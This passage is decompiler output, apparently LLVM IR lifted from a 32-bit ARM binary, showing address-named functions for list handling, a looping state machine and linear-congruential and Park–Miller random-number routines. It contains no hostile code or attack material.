  br i1 %v2_10178, label %dec_label_pc_101f0, label %dec_label_pc_10180

dec_label_pc_10180:                               ; preds = %dec_label_pc_10178
  %v1_10180 = add i32 %v0_1018c, 12
  %v9_10184 = icmp eq i32 %v1_10180, %arg2
  br i1 %v9_10184, label %dec_label_pc_1018c, label %dec_label_pc_101f0

dec_label_pc_1018c:                               ; preds = %dec_label_pc_10180
  %v1_1018c = inttoptr i32 %v0_1018c to i32*
  %v2_1018c = load i32, i32* %v1_1018c, align 4
  %v1_10190 = add i32 %v0_1018c, 8
  %v2_10190 = inttoptr i32 %v1_10190 to i32*
  %v3_10190 = load i32, i32* %v2_10190, align 4
  store i32 %v3_10190, i32* @r2, align 4
  store i32 %v0_10194, i32* @r1, align 4
  %v2_10198 = add i32 %v2_1018c, %v2_10170
  store i32 %v2_10198, i32* %r7.global-to-local, align 4
  %v0_1019c = call i32 @function_10114()
  br label %dec_label_pc_101f0

dec_label_pc_101a4:                               ; preds = %dec_label_pc_10170
  %v1_101a4 = add i32 %v0_10194, 4
  %v2_101a4 = inttoptr i32 %v1_101a4 to i32*
  %v3_101a4 = load i32, i32* %v2_101a4, align 4
  store i32 %v3_101a4, i32* %r5.global-to-local, align 4
  %v2_101a8 = icmp eq i32 %v3_101a4, 0
  br i1 %v2_101a8, label %dec_label_pc_101dc, label %dec_label_pc_101b0

dec_label_pc_101b0:                               ; preds = %dec_label_pc_101a4
  %v1_101b0 = inttoptr i32 %v3_101a4 to i32*
  %v2_101b0 = load i32, i32* %v1_101b0, align 4
  store i32 %v2_101b0, i32* @ip, align 4
  %v2_101b4 = sub i32 %v3_101a4, %v2_101b0
  %v1_101b8 = add i32 %v2_101b4, 12
  %v9_101bc = icmp eq i32 %v2_10130, %v1_101b8
  br i1 %v9_101bc, label %dec_label_pc_101c4, label %dec_label_pc_101dc

dec_label_pc_101c4:                               ; preds = %dec_label_pc_101b0
  store i32 %v0_1018c, i32* @r2, align 4
  store i32 %v3_101a4, i32* @r1, align 4
  %v2_101cc = add i32 %v2_101b0, %v2_10170
  store i32 %v2_101cc, i32* %r7.global-to-local, align 4
  %v0_101d0 = call i32 @function_10114()
  %v0_101d4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_101d4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_101f0

dec_label_pc_101dc:                               ; preds = %dec_label_pc_101b0, %dec_label_pc_101a4
  %v2_101dc = add i32 %v0_10194, %arg3
  store i32 %v2_101dc, i32* %r4.global-to-local, align 4
  store i32 %v3_101a4, i32* @r3, align 4
  store i32 %v0_1018c, i32* @r2, align 4
  store i32 %v2_101dc, i32* @r1, align 4
  %v0_101ec = call i32 @function_100f4()
  br label %dec_label_pc_101f0

dec_label_pc_101f0:                               ; preds = %dec_label_pc_10180, %dec_label_pc_10178, %dec_label_pc_101c4, %dec_label_pc_1018c, %dec_label_pc_101dc
  %v0_101f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_101f0, i32* %r5.global-to-local, align 4
  %v0_101f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_101f4 = inttoptr i32 %v0_101f0 to i32*
  store i32 %v0_101f4, i32* %v2_101f4, align 4
  br label %dec_label_pc_10214

dec_label_pc_1014c.dec_label_pc_101fc.loopexit_crit_edge: ; preds = %dec_label_pc_10144
  br label %dec_label_pc_101fc

dec_label_pc_101fc:                               ; preds = %dec_label_pc_10128, %dec_label_pc_1014c.dec_label_pc_101fc.loopexit_crit_edge, %dec_label_pc_1015c
  %v1_101fc = add i32 %v2_10130, -12
  store i32 %v1_101fc, i32* %r5.global-to-local, align 4
  %v3_10200 = inttoptr i32 %v1_101fc to i32*
  store i32 %arg3, i32* %v3_10200, align 4
  %v0_10204 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10204, i32* @r3, align 4
  %v0_10208 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10208, i32* @r2, align 4
  %v0_1020c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1020c, i32* @r1, align 4
  %v0_10210 = call i32 @function_100f4()
  br label %dec_label_pc_10214

dec_label_pc_10214:                               ; preds = %dec_label_pc_101f0, %dec_label_pc_101fc
  %v0_10214 = load i32, i32* %r5.global-to-local, align 4
  %v2_10218 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10218, i32* @r4, align 4
  ret i32 %v0_10214

; uselistorder directives
  uselistorder i32 %v3_101a4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_10168, { 1, 0 }
  uselistorder i32 %v3_10148, { 2, 3, 1, 0 }
  uselistorder i32 %v0_10194, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_1018c, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @function_100f4, { 1, 0 }
  uselistorder i32 ()* @function_10114, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10214, { 1, 0 }
  uselistorder label %dec_label_pc_101fc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_101f0, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1013c, { 1, 0 }
}

define i32 @function_1021c() local_unnamed_addr {
dec_label_pc_10238.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_1021c = ptrtoint i32* %stack_var_-268 to i32
  %v1_1022c = call i32 @function_10d4c()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_10238 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_10238

dec_label_pc_10238:                               ; preds = %dec_label_pc_10238.lr.ph, %dec_label_pc_10238
  %v1_1023c = phi i32 [ 31, %dec_label_pc_10238.lr.ph ], [ %v1_10248, %dec_label_pc_10238 ]
  %v4_1023c = mul i32 %v1_1023c, 4
  %v5_1023c = add i32 %v4_1023c, %v2_10238
  %v2_10244 = add i32 %v5_1023c, -128
  %v3_10244 = inttoptr i32 %v2_10244 to i32*
  store i32 0, i32* %v3_10244, align 4
  %v0_10248 = load i32, i32* %r1.global-to-local, align 4
  %v1_10248 = add i32 %v0_10248, -1
  store i32 %v1_10248, i32* %r1.global-to-local, align 4
  %v6_10248 = icmp slt i32 %v1_10248, 0
  br i1 %v6_10248, label %dec_label_pc_10250, label %dec_label_pc_10238

dec_label_pc_10250:                               ; preds = %dec_label_pc_10238
  %v2_10250 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_10250, i32* @r4, align 4
  store i32 6, i32* %r1.global-to-local, align 4
  %v2_1025c = call i32 @function_13870(i32 %v2_10250, i32 6)
  %v2_10260 = icmp eq i32 %v2_1025c, 0
  br i1 %v2_10260, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_10250
  store i32 %v2_10250, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10250, %bb
  store i32 66164, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10260, i32 ptrtoint (i32* @global_var_11494.464 to i32))
  %v2_10278 = load i32, i32* @global_var_22c70.466, align 4
  %v2_1027c = icmp eq i32 %v2_10278, 0
  br i1 %v2_1027c, label %dec_label_pc_10284, label %dec_label_pc_102b4

dec_label_pc_10284:                               ; preds = %.thread1
  store i32 1, i32* @global_var_22c70.466, align 4
  br label %dec_label_pc_1028c

dec_label_pc_1028c:                               ; preds = %dec_label_pc_10304, %dec_label_pc_10284
  %v1_10298 = call i32 @function_10d4c()
  %v1_102a0 = call i32 @function_13834(i32 6)
  store i32 66228, i32* @lr, align 4
  %v1_102b0 = call i32 @function_10d4c()
  %v2_102b8.pre = load i32, i32* @global_var_22c70.466, align 4
  br label %dec_label_pc_102b4

dec_label_pc_102b4:                               ; preds = %.thread1, %dec_label_pc_1028c
  %v0_10328 = phi i32 [ %v2_10278, %.thread1 ], [ %v2_102b8.pre, %dec_label_pc_1028c ]
  store i32 ptrtoint (i32* @global_var_22c70.466 to i32), i32* %ip.global-to-local, align 4
  %v7_102bc = icmp eq i32 %v0_10328, 1
  br i1 %v7_102bc, label %dec_label_pc_102ec.lr.ph, label %dec_label_pc_10320

dec_label_pc_102ec.lr.ph:                         ; preds = %dec_label_pc_102b4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_22c70.466, align 4
  %v2_102d8 = bitcast i32* %stack_var_-268 to i8*
  %v3_102d8 = call i32 @function_ef70(i8* %v2_102d8, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_102ec

dec_label_pc_102ec:                               ; preds = %dec_label_pc_102ec.lr.ph, %dec_label_pc_102ec
  %v1_102f0 = phi i32 [ 31, %dec_label_pc_102ec.lr.ph ], [ %v1_102fc, %dec_label_pc_102ec ]
  %v4_102f0 = mul i32 %v1_102f0, 4
  %v5_102f0 = add i32 %v4_102f0, %v2_10238
  %v2_102f8 = add i32 %v5_102f0, -264
  %v3_102f8 = inttoptr i32 %v2_102f8 to i32*
  store i32 -1, i32* %v3_102f8, align 4
  %v0_102fc = load i32, i32* %r1.global-to-local, align 4
  %v1_102fc = add i32 %v0_102fc, -1
  store i32 %v1_102fc, i32* %r1.global-to-local, align 4
  %v6_102fc = icmp slt i32 %v1_102fc, 0
  br i1 %v6_102fc, label %dec_label_pc_10304, label %dec_label_pc_102ec

dec_label_pc_10304:                               ; preds = %dec_label_pc_102ec
  store i32 %v2_1021c, i32* %r1.global-to-local, align 4
  %v4_10318 = call i32 @function_11038(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_1028c

dec_label_pc_10320:                               ; preds = %dec_label_pc_102b4
  %v7_10320 = icmp eq i32 %v0_10328, 2
  br i1 %v7_10320, label %dec_label_pc_10328, label %dec_label_pc_10334

dec_label_pc_10328:                               ; preds = %dec_label_pc_10320
  store i32 3, i32* @global_var_22c70.466, align 4
  %v0_10330 = call i32 @function_1021c()
  %v2_10334.pre = load i32, i32* @global_var_22c70.466, align 4
  br label %dec_label_pc_10334

dec_label_pc_10334:                               ; preds = %dec_label_pc_10320, %dec_label_pc_10328
  %v1_1033c = phi i32 [ %v0_10328, %dec_label_pc_10320 ], [ %v2_10334.pre, %dec_label_pc_10328 ]
  %v7_10338 = icmp eq i32 %v1_1033c, 3
  br i1 %v7_10338, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_10334
  %v2_10344 = load i32, i32* %ip.global-to-local, align 4
  %v3_10344 = inttoptr i32 %v2_10344 to i32*
  store i32 4, i32* %v3_10344, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_10334, %bb27
  call void @__pseudo_cond_branch(i1 %v7_10338, i32 ptrtoint (i32* @global_var_11248.468 to i32))
  br label %dec_label_pc_1034c

dec_label_pc_1034c:                               ; preds = %dec_label_pc_1034c, %.thread3
  %v0_1034c = call i32 @function_1021c()
  br label %dec_label_pc_1034c

; uselistorder directives
  uselistorder i32 %v1_102fc, { 2, 1, 0 }
  uselistorder i32 %v1_10248, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 5, 6, 7, 9, 8, 2 }
  uselistorder i32* @global_var_22c70.466, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_10334, { 1, 0 }
  uselistorder label %dec_label_pc_102ec, { 1, 0 }
  uselistorder label %dec_label_pc_102b4, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_10238, { 1, 0 }
}

define i32 @function_10364() local_unnamed_addr {
dec_label_pc_10364:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_10368 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2051c.470 to i32), i32* @r4, align 4
  %v2_10370 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10370, i32* @r0, align 4
  %v1_10388 = call i32 @function_10d54()
  %v1_10398 = call i32 @function_10d4c()
  %v2_1039c = ptrtoint i32* %stack_var_-16 to i32
  %v3_103a4 = call i32 @function_10644(i32* inttoptr (i32 132404 to i32*), i32 %v2_1039c)
  store i32 %v2_10370, i32* @r0, align 4
  store i32 66492, i32* @lr, align 4
  %v1_103b8 = call i32 @function_10d54()
  %v3_103bc = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_10368, i32* @r4, align 4
  ret i32 %v3_103bc
}

define i32 @function_10508(i32 %arg1) local_unnamed_addr {
dec_label_pc_10508:
  %stack_var_-32 = alloca i32, align 4
  %v3_10508 = load i32, i32* @r4, align 4
  %v9_10508 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_2051c.470 to i32), i32* @r4, align 4
  %v2_10510 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_10510, i32* @r0, align 4
  %v1_1052c = call i32 @function_10d54()
  store i32 66880, i32* @lr, align 4
  %v1_1053c = call i32 @function_10d4c()
  %v0_10540 = load i32, i32* @r6, align 4
  store i32 %v0_10540, i32* @r0, align 4
  %v2_10548 = inttoptr i32 %v0_10540 to i32*
  %v3_10548 = call i32 @function_106d4(i32* %v2_10548, i32 ptrtoint (i32* @global_var_20534 to i32))
  store i32 %v2_10510, i32* @r0, align 4
  %v1_10560 = call i32 @function_10d54()
  store i32 %v3_10508, i32* @r4, align 4
  store i32 %v9_10508, i32* @r6, align 4
  ret i32 %v1_10560
}

define i32 @function_10644(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10644:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_10644 = add i32 %tmp, 12
  %v2_10644 = inttoptr i32 %v1_10644 to i32*
  %v3_10644 = load i32, i32* %v2_10644, align 4
  store i32 %v3_10644, i32* %r3.global-to-local, align 4
  %v2_10648 = icmp eq i32 %v3_10644, 0
  %v3_1064c = load i32, i32* @r4, align 4
  store i32 %v3_1064c, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_10658 = add i32 %tmp, 8
  %v2_10658 = inttoptr i32 %v1_10658 to i32*
  %v3_10658 = load i32, i32* %v2_10658, align 4
  store i32 %v3_10658, i32* %lr.global-to-local, align 4
  br i1 %v2_10648, label %dec_label_pc_10660, label %dec_label_pc_10684

dec_label_pc_10660:                               ; preds = %dec_label_pc_10644
  %v1_10660 = inttoptr i32 %v3_10658 to i32*
  %v2_10660 = load i32, i32* %v1_10660, align 4
  store i32 %v2_10660, i32* %r2.global-to-local, align 4
  %v2_10668 = mul i32 %v2_10660, 1103515245
  %v1_10670 = add i32 %v2_10668, 12345
  %tmp10 = bitcast i32 %v1_10670 to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_10674 = bitcast float %tmp11 to i32
  store i32 %v1_10674, i32* %r3.global-to-local, align 4
  store i32 %v1_10674, i32* %v1_10660, align 4
  %v0_1067c = load i32, i32* %r3.global-to-local, align 4
  %v2_1067c = inttoptr i32 %arg2 to i32*
  store i32 %v0_1067c, i32* %v2_1067c, align 4
  br label %dec_label_pc_106c8

dec_label_pc_10684:                               ; preds = %dec_label_pc_10644
  %v2_10684 = load i32, i32* %arg1, align 4
  store i32 %v2_10684, i32* %r2.global-to-local, align 4
  %v1_10688 = add i32 %tmp, 4
  %v2_10688 = inttoptr i32 %v1_10688 to i32*
  %v3_10688 = load i32, i32* %v2_10688, align 4
  store i32 %v3_10688, i32* %r0.global-to-local, align 4
  %v1_1068c = inttoptr i32 %v2_10684 to i32*
  %v2_1068c = load i32, i32* %v1_1068c, align 4
  store i32 %v2_1068c, i32* %r3.global-to-local, align 4
  %v1_10690 = inttoptr i32 %v3_10688 to i32*
  %v2_10690 = load i32, i32* %v1_10690, align 4
  %v4_10690 = add i32 %v3_10688, 4
  store i32 %v4_10690, i32* %r0.global-to-local, align 4
  %v2_10694 = add i32 %v2_10690, %v2_1068c
  store i32 %v2_10694, i32* %r3.global-to-local, align 4
  store i32 %v2_10694, i32* %v1_1068c, align 4
  %v3_10698 = load i32, i32* %r2.global-to-local, align 4
  %v4_10698 = add i32 %v3_10698, 4
  store i32 %v4_10698, i32* %r2.global-to-local, align 4
  %v0_1069c = load i32, i32* %ip.global-to-local, align 4
  %v1_1069c = add i32 %v0_1069c, 24
  %v2_1069c = inttoptr i32 %v1_1069c to i32*
  %v3_1069c = load i32, i32* %v2_1069c, align 4
  store i32 %v3_1069c, i32* %r4.global-to-local, align 4
  %v0_106a0 = load i32, i32* %r3.global-to-local, align 4
  %v3_106a0 = udiv i32 %v0_106a0, 2
  store i32 %v3_106a0, i32* %r3.global-to-local, align 4
  %v3_106a4 = icmp ult i32 %v4_10698, %v3_1069c
  %v1_106a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_106a8 = inttoptr i32 %v1_106a8 to i32*
  store i32 %v3_106a0, i32* %v2_106a8, align 4
  br i1 %v3_106a4, label %dec_label_pc_106b8, label %bb

bb:                                               ; preds = %dec_label_pc_10684
  %v1_106ac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_106ac, i32* %r2.global-to-local, align 4
  %v0_106b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_106b0, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_106b8:                               ; preds = %dec_label_pc_10684
  %v0_106b01 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_106b01, i32* %r3.global-to-local, align 4
  %v1_106b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_106b8 = icmp ult i32 %v0_106b01, %v1_106b8
  br i1 %v3_106b8, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_106b8
  store i32 %v0_106b01, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_106b8
  %v1_106c0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_106c0, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_106c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_106c4 = inttoptr i32 %v0_106c4 to i32*
  %v2_106c4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_106c4, i32* %v1_106c4, align 4
  %v3_106c4 = add i32 %v0_106c4, 4
  %v4_106c4 = inttoptr i32 %v3_106c4 to i32*
  %v5_106c4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_106c4, i32* %v4_106c4, align 4
  br label %dec_label_pc_106c8

dec_label_pc_106c8:                               ; preds = %dec_label_pc_10660, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_106cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_106cc, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_106b01, { 1, 0, 2 }
  uselistorder i32 %v3_106a0, { 1, 0 }
  uselistorder i32 %v1_10674, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_106c8, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @function_106d4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_106d4:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_106d4 = load i32, i32* @r4, align 4
  store i32 %v3_106d4, i32* %stack_var_-32, align 4
  %v6_106d4 = load i32, i32* @r5, align 4
  %v1_106d8 = add i32 %tmp, 12
  %v2_106d8 = inttoptr i32 %v1_106d8 to i32*
  %v3_106d8 = load i32, i32* %v2_106d8, align 4
  %v2_106e0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp22 = icmp ugt i32 %v3_106d8, 4
  br i1 %tmp22, label %.dec_label_pc_1078c_crit_edge, label %dec_label_pc_106f0

.dec_label_pc_1078c_crit_edge:                    ; preds = %dec_label_pc_106d4
  br label %dec_label_pc_1078c

dec_label_pc_106f0:                               ; preds = %dec_label_pc_106d4
  %v0_106f0 = load i32, i32* @r0, align 4
  %v2_106f0 = icmp eq i32 %v0_106f0, 0
  %v1_106f4 = add i32 %tmp, 8
  %v2_106f4 = inttoptr i32 %v1_106f4 to i32*
  %v3_106f4 = load i32, i32* %v2_106f4, align 4
  store i32 %v3_106f4, i32* %r7.global-to-local, align 4
  br i1 %v2_106f0, label %bb, label %bb19

bb:                                               ; preds = %dec_label_pc_106f0
  store i32 1, i32* @r0, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_106f0, %bb
  %v0_10700 = phi i32 [ %v0_106f0, %dec_label_pc_106f0 ], [ 1, %bb ]
  %v2_106fc = icmp eq i32 %v3_106d8, 0
  %v2_10700 = inttoptr i32 %v3_106f4 to i32*
  store i32 %v0_10700, i32* %v2_10700, align 4
  br i1 %v2_106fc, label %dec_label_pc_10788, label %dec_label_pc_10708

dec_label_pc_10708:                               ; preds = %bb19
  %v1_10708 = add i32 %tmp, 16
  %v2_10708 = inttoptr i32 %v1_10708 to i32*
  %v3_10708 = load i32, i32* %v2_10708, align 4
  store i32 %v3_10708, i32* %sb.global-to-local, align 4
  %v0_1070c = load i32, i32* @r0, align 4
  store i32 %v0_1070c, i32* @r5, align 4
  %v0_10710 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10710, i32* %sl.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10748

dec_label_pc_1071c:                               ; preds = %dec_label_pc_10748
  %v2_1071c = call i32 @function_cafc(i32 %v0_1074c, i32 127773)
  store i32 127773, i32* @r1, align 4
  %v2_10728 = mul i32 %v2_1071c, 16807
  %v0_1072c = load i32, i32* @r5, align 4
  store i32 %v0_1072c, i32* @r0, align 4
  %v0_10730 = call i32 @function_15030()
  %tmp23 = mul i32 %v0_10730, -2836
  %v2_1073c = add i32 %v2_10728, %tmp23
  %v8_1073c = icmp slt i32 %v2_1073c, 0
  br i1 %v8_1073c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_1071c
  %v2_10740 = add i32 %v2_1073c, 2147483647
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_1071c, %bb20
  %storemerge = phi i32 [ %v2_10740, %bb20 ], [ %v2_1073c, %dec_label_pc_1071c ]
  %v0_10744 = phi i32 [ %v2_10740, %bb20 ], [ %v2_1073c, %dec_label_pc_1071c ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_10744 = load i32, i32* %sl.global-to-local, align 4
  %v2_10744 = add i32 %v1_10744, 4
  %v3_10744 = inttoptr i32 %v2_10744 to i32*
  store i32 %v0_10744, i32* %v3_10744, align 4
  %v4_10744 = load i32, i32* %sl.global-to-local, align 4
  %v5_10744 = add i32 %v4_10744, 4
  store i32 %v5_10744, i32* %sl.global-to-local, align 4
  %v0_10748.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10748.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_1074c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10748

dec_label_pc_10748:                               ; preds = %dec_label_pc_10708, %bb21
  %v0_1074c = phi i32 [ %v0_1070c, %dec_label_pc_10708 ], [ %v0_1074c.pre, %bb21 ]
  %v0_10760 = phi i32 [ %v3_10708, %dec_label_pc_10708 ], [ %v1_10748.pre, %bb21 ]
  %v0_10754 = phi i32 [ 1, %dec_label_pc_10708 ], [ %v0_10748.pre, %bb21 ]
  %v1_10754 = add i32 %v0_10754, 1
  store i32 %v1_10754, i32* %r8.global-to-local, align 4
  %v5_10758 = icmp slt i32 %v0_10754, %v0_10760
  br i1 %v5_10758, label %dec_label_pc_1071c, label %dec_label_pc_1075c

dec_label_pc_1075c:                               ; preds = %dec_label_pc_10748
  %v2_10760 = mul i32 %v0_10760, 10
  store i32 %v2_10760, i32* @r4, align 4
  %v0_10764 = load i32, i32* %r6.global-to-local, align 4
  %v1_10764 = add i32 %v0_10764, 20
  %v2_10764 = inttoptr i32 %v1_10764 to i32*
  %v3_10764 = load i32, i32* %v2_10764, align 4
  %v0_10768 = load i32, i32* %r7.global-to-local, align 4
  %v4_10768 = mul i32 %v3_10764, 4
  %v5_10768 = add i32 %v0_10768, %v4_10768
  %v1_1076c = inttoptr i32 %v0_10764 to i32*
  store i32 %v5_10768, i32* %v1_1076c, align 4
  %v3_1076c = add i32 %v0_10764, 4
  %v4_1076c = inttoptr i32 %v3_1076c to i32*
  %v5_1076c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_1076c, i32* %v4_1076c, align 4
  br label %dec_label_pc_10778

dec_label_pc_10774:                               ; preds = %dec_label_pc_10778
  %v0_1077c = load i32, i32* %r6.global-to-local, align 4
  %v2_10774 = inttoptr i32 %v0_1077c to i32*
  %v3_10774 = call i32 @function_10644(i32* %v2_10774, i32 %v2_106e0)
  br label %dec_label_pc_10778

dec_label_pc_10778:                               ; preds = %dec_label_pc_1075c, %dec_label_pc_10774
  %v0_10778 = load i32, i32* @r4, align 4
  %v1_10778 = add i32 %v0_10778, -1
  store i32 %v1_10778, i32* @r4, align 4
  %v6_10778 = icmp slt i32 %v1_10778, 0
  br i1 %v6_10778, label %dec_label_pc_10788, label %dec_label_pc_10774

dec_label_pc_10788:                               ; preds = %dec_label_pc_10778, %bb19
  %v2_10790.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_1078c

dec_label_pc_1078c:                               ; preds = %.dec_label_pc_1078c_crit_edge, %dec_label_pc_10788
  %v2_10790 = phi i32 [ %v3_106d4, %.dec_label_pc_1078c_crit_edge ], [ %v2_10790.pre, %dec_label_pc_10788 ]
  %v26_10790 = phi i32 [ -1, %.dec_label_pc_1078c_crit_edge ], [ 0, %dec_label_pc_10788 ]
  store i32 %v2_10790, i32* @r4, align 4
  store i32 %v6_106d4, i32* @r5, align 4
  ret i32 %v26_10790

; uselistorder directives
  uselistorder i32 %v1_10778, { 1, 0 }
  uselistorder i32 %v0_10764, { 1, 0, 2 }
  uselistorder i32 %v0_10754, { 1, 0 }
  uselistorder i32 %v2_1073c, { 0, 3, 2, 1 }
  uselistorder i32 %v3_106d8, { 1, 0 }
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_1078c, { 1, 0 }
  uselistorder label %dec_label_pc_10778, { 1, 0 }
  uselistorder label %dec_label_pc_10748, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_10794(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10794:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_10794 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10794, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_10794
  %v1_10794 = load i32, i32* @r0, align 4
  %v2_10794 = load i32, i32* @r7, align 4
  %v5_10794 = udiv i32 %v2_10794, 8
  %v6_10794 = and i32 %v5_10794, %v1_10794
  store i32 %v6_10794, i32* @r4, align 4
  %v2_10798 = load i32, i32* @sp, align 4
  %v8_10798 = shl i32 %v2_10798, %arg4
  %v9_10798 = and i32 %v8_10798, %tmp
  call void @__pseudo_branch(i32 %v9_10798)
  %v0_1079c.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1079c.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v1_1079c = load i32, i32* @r0, align 4
  %v2_1079c = load i32, i32* @r4, align 4
  %v3_1079c = load i32, i32* @fp, align 4
  %v8_1079c = shl i32 %v2_1079c, %v3_1079c
